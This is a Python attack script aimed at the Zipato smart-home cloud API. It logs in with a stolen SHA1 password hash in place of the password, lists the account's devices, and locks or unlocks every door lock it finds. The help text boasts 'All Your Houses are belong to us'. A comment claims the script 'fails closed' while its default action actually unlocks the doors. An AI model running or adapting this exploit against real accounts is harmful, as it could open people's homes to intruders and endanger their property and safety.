#Written by Charles Dardaman
#INIT_6 Adapted Charles' script for attacking the remote api.

import requests
import hashlib
import sys
import os
import json
import subprocess
import logging
import argparse

def run(username, password, lock):
    url = "https://my.zipato.com/zipato-web/v2"

    print("Building Crowbar")
    #Get nonce
    r = requests.get(url + "/user/init")

    data = json.loads(r.text)
    nonce = data["nonce"]
    print("Nonce: %s" % (nonce) )

    jessionid = data["jsessionid"]
    cookies = {"JSESSIONID": jessionid}

    #SHA work SHA1(nonce+password=token)
    np = nonce + password
    print("nonce + password: %s " % (np) )

    hash_object = hashlib.sha1(np.encode())
    token = hash_object.hexdigest()
    print("token: %s" % (token) )

    #Send Login Request
    r = requests.get(url + "/user/login?username="+username+"&token="+token,cookies=cookies)

    print(r.text)
    data = json.loads(r.text)

    if not data["success"]:
        print("Pure Failure")

    # Get Users
    r = requests.get(url + "/users", cookies=cookies)
    users = json.loads(r.text)

    # Get Devices
    r = requests.get(url + "/devices", cookies=cookies)
    devices = json.loads(r.text)

    # Get all device endpoints and search for Door locks, get all door lock endpoints STATE attributes and then either lock or unlock the doors.
    door_lock_endpoints = []
    device_uuids = []
    for device in devices:
        if 'uuid' in device.keys():
            device_uuids.append(device['uuid'])

    for uuid in device_uuids:
        r = requests.get(url + "/devices/"+uuid+"/endpoints",cookies=cookies)
        data = json.loads(r.text)
        if data:
            r = requests.get(url + "/endpoints/"+data[0]['uuid']+"?attributes=true",cookies=cookies)
            data = json.loads(r.text)
            if 'Door Lock' in data['name']:
                for attribute in data['attributes']:
                    if attribute['name'] == 'STATE':
                        door_lock_endpoints.append(attribute['uuid'])

    if door_lock_endpoints:
        for uuid in door_lock_endpoints:
            if lock:
                r = requests.put(url + "/attributes/"+uuid+"/value",cookies=cookies,json={"value":"true"})
                print("Door Locked")
            else:
                r = requests.put(url + "/attributes/"+uuid+"/value",cookies=cookies,json={"value":"false"})
                print("Door Opened")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Zipato API\nAll Your Houses are belong to us...",epilog=None)
    parser.add_argument("-u","--username",help="Zipato Username",type=str,required=True)
    parser.add_argument("-p","--password",help="Zipato SHA1 Password Hash",type=str,required=True)
    parser.add_argument("--lock",help="Lock Doors",action='store_true')
    parser.add_argument("--unlock",help="Unlock Doors",action='store_true')

    opt = parser.parse_args()
    #Lock = True or unlock = False
    #Fail closed for security.
    try:
        if opt.lock:
            lock = True
        elif opt.unlock:
            lock = False
        else:
            lock = False
    except:
        lock = False

    run(opt.username, opt.password, lock)